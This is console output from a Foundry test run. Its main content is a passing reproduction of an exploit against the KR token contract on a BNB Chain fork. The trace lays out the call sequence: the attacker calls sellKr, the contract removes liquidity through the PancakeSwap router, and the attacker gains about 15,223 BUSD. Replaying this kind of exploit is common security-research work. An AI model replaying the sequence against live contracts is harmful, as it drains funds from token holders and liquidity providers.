Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.14s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 241.92ms (111.00µs CPU time)

Ran 1 test for src/test/2023-11/KR_exp.sol:ContractTest
[PASS] testExploit() (gas: 247511)
Logs:
  Attacker BUSD balance before attack: 0
  Attacker BUSD balance after attack: 15223.241888746298088968

Traces:
  [310011] ContractTest::testExploit()
    ├─ [2531] BUSD::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 26510000000000000000 [2.651e19]
    ├─ [10871] BUSD::transfer(0x000000000000000000000000000000000000dEaD, 26510000000000000000 [2.651e19])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x000000000000000000000000000000000000dEaD, value: 26510000000000000000 [2.651e19])
    │   └─ ← [Return] true
    ├─ [531] BUSD::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "Attacker BUSD balance before attack", val: 0)
    ├─ [2629] KR::balanceOf(0xAD1e7BF0A469b7B912D2B9d766d0C93291cA2656) [staticcall]
    │   └─ ← [Return] 108392423293672858446138653 [1.083e26]
    ├─ [254079] KR::sellKr(101888877896052486939370333 [1.018e26])
    │   ├─ [629] KR::balanceOf(0xAD1e7BF0A469b7B912D2B9d766d0C93291cA2656) [staticcall]
    │   │   └─ ← [Return] 108392423293672858446138653 [1.083e26]
    │   ├─ [2439] 0xAD1e7BF0A469b7B912D2B9d766d0C93291cA2656::totalSupply() [staticcall]
    │   │   └─ ← [Return] 1436978942522210792630837 [1.436e24]
    │   ├─ [2531] BUSD::balanceOf(KR: [0x15b1Ed79cA9D7955AF3E169d7B323c4F1eeb5D12]) [staticcall]
    │   │   └─ ← [Return] 2
    │   ├─ [147275] 0x10ED43C718714eb63d5aA57B78B54704E256024E::removeLiquidity(KR: [0x15b1Ed79cA9D7955AF3E169d7B323c4F1eeb5D12], BUSD: [0x55d398326f99059fF775485246999027B3197955], 1350760205970878145072986 [1.35e24], 91699990106447238245433299 [9.169e25], 0, KR: [0x15b1Ed79cA9D7955AF3E169d7B323c4F1eeb5D12], 1699309385 [1.699e9])
    │   │   ├─ [32276] 0xAD1e7BF0A469b7B912D2B9d766d0C93291cA2656::transferFrom(KR: [0x15b1Ed79cA9D7955AF3E169d7B323c4F1eeb5D12], 0xAD1e7BF0A469b7B912D2B9d766d0C93291cA2656, 1350760205970878145072986 [1.35e24])
    │   │   │   ├─ emit Transfer(from: KR: [0x15b1Ed79cA9D7955AF3E169d7B323c4F1eeb5D12], to: 0xAD1e7BF0A469b7B912D2B9d766d0C93291cA2656, value: 1350760205970878145072986 [1.35e24])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [112642] 0xAD1e7BF0A469b7B912D2B9d766d0C93291cA2656::burn(KR: [0x15b1Ed79cA9D7955AF3E169d7B323c4F1eeb5D12])
    │   │   │   ├─ [629] KR::balanceOf(0xAD1e7BF0A469b7B912D2B9d766d0C93291cA2656) [staticcall]
    │   │   │   │   └─ ← [Return] 108392423293672858446138653 [1.083e26]
    │   │   │   ├─ [2531] BUSD::balanceOf(0xAD1e7BF0A469b7B912D2B9d766d0C93291cA2656) [staticcall]
    │   │   │   │   └─ ← [Return] 19052868446490986344141 [1.905e22]
    │   │   │   ├─ [2354] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::feeTo() [staticcall]
    │   │   │   │   └─ ← [Return] 0x0ED943Ce24BaEBf257488771759F9BF482C39706
    │   │   │   ├─ emit Transfer(from: 0xAD1e7BF0A469b7B912D2B9d766d0C93291cA2656, to: 0x0000000000000000000000000000000000000000, value: 1350760205970878145072986 [1.35e24])
    │   │   │   ├─ [25974] KR::transfer(KR: [0x15b1Ed79cA9D7955AF3E169d7B323c4F1eeb5D12], 101888877896052486939370274 [1.018e26])
    │   │   │   │   ├─ emit Transfer(from: 0xAD1e7BF0A469b7B912D2B9d766d0C93291cA2656, to: KR: [0x15b1Ed79cA9D7955AF3E169d7B323c4F1eeb5D12], value: 81511102316841989551496219 [8.151e25])
    │   │   │   │   ├─ emit Transfer(from: 0xAD1e7BF0A469b7B912D2B9d766d0C93291cA2656, to: 0x000000000000000000000000000000000000dEaD, value: 20377775579210497387874054 [2.037e25])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [8871] BUSD::transfer(KR: [0x15b1Ed79cA9D7955AF3E169d7B323c4F1eeb5D12], 17909696339701527163492 [1.79e22])
    │   │   │   │   ├─ emit Transfer(from: 0xAD1e7BF0A469b7B912D2B9d766d0C93291cA2656, to: KR: [0x15b1Ed79cA9D7955AF3E169d7B323c4F1eeb5D12], value: 17909696339701527163492 [1.79e22])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [629] KR::balanceOf(0xAD1e7BF0A469b7B912D2B9d766d0C93291cA2656) [staticcall]
    │   │   │   │   └─ ← [Return] 6503545397620371506768380 [6.503e24]
    │   │   │   ├─ [531] BUSD::balanceOf(0xAD1e7BF0A469b7B912D2B9d766d0C93291cA2656) [staticcall]
    │   │   │   │   └─ ← [Return] 1143172106789459180649 [1.143e21]
    │   │   │   ├─ emit Sync(reserve0: 6503545397620371506768380 [6.503e24], reserve1: 1143172106789459180649 [1.143e21])
    │   │   │   ├─ emit Burn(sender: 0x10ED43C718714eb63d5aA57B78B54704E256024E, amount0: 101888877896052486939370274 [1.018e26], amount1: 17909696339701527163492 [1.79e22], to: KR: [0x15b1Ed79cA9D7955AF3E169d7B323c4F1eeb5D12])
    │   │   │   └─ ← [Return] 101888877896052486939370274 [1.018e26], 17909696339701527163492 [1.79e22]
    │   │   └─ ← [Return] 101888877896052486939370274 [1.018e26], 17909696339701527163492 [1.79e22]
    │   ├─ [531] BUSD::balanceOf(KR: [0x15b1Ed79cA9D7955AF3E169d7B323c4F1eeb5D12]) [staticcall]
    │   │   └─ ← [Return] 17909696339701527163494 [1.79e22]
    │   ├─ [3271] BUSD::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 15223241888746298088968 [1.522e22])
    │   │   ├─ emit Transfer(from: KR: [0x15b1Ed79cA9D7955AF3E169d7B323c4F1eeb5D12], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 15223241888746298088968 [1.522e22])
    │   │   └─ ← [Return] true
    │   ├─ [8071] BUSD::transfer(0xA11c1C398b3B5C5718Ed9A8A56f65625D612D7F6, 897275786619046510891 [8.972e20])
    │   │   ├─ emit Transfer(from: KR: [0x15b1Ed79cA9D7955AF3E169d7B323c4F1eeb5D12], to: 0xA11c1C398b3B5C5718Ed9A8A56f65625D612D7F6, value: 897275786619046510891 [8.972e20])
    │   │   └─ ← [Return] true
    │   ├─ [8071] BUSD::transfer(0x44A07c78C9C515dC05faE48bc85ab6a5C1B12fB3, 1789178664336182563632 [1.789e21])
    │   │   ├─ emit Transfer(from: KR: [0x15b1Ed79cA9D7955AF3E169d7B323c4F1eeb5D12], to: 0x44A07c78C9C515dC05faE48bc85ab6a5C1B12fB3, value: 1789178664336182563632 [1.789e21])
    │   │   └─ ← [Return] true
    │   ├─  emit topic 0: 0x0f2f8766c626e6799a3584b5936bf34d96d303c9fdfd1ed146d4caddb2298725
    │   │        topic 1: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │           data: 0x00000000000000000000000000000000000000000000033940ebb19f59bf1e08000000000000000000000000000000000000000000000030a433f5f58b76c12b
    │   └─ ← [Return] 0x00000000000000000000000000000000000000000000033940ebb19f59bf1e08
    ├─ [531] BUSD::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 15223241888746298088968 [1.522e22]
    ├─ emit log_named_decimal_uint(key: "Attacker BUSD balance after attack", val: 15223241888746298088968 [1.522e22], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.65s (2.38s CPU time)

Ran 2 test suites in 2.90s (2.90s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
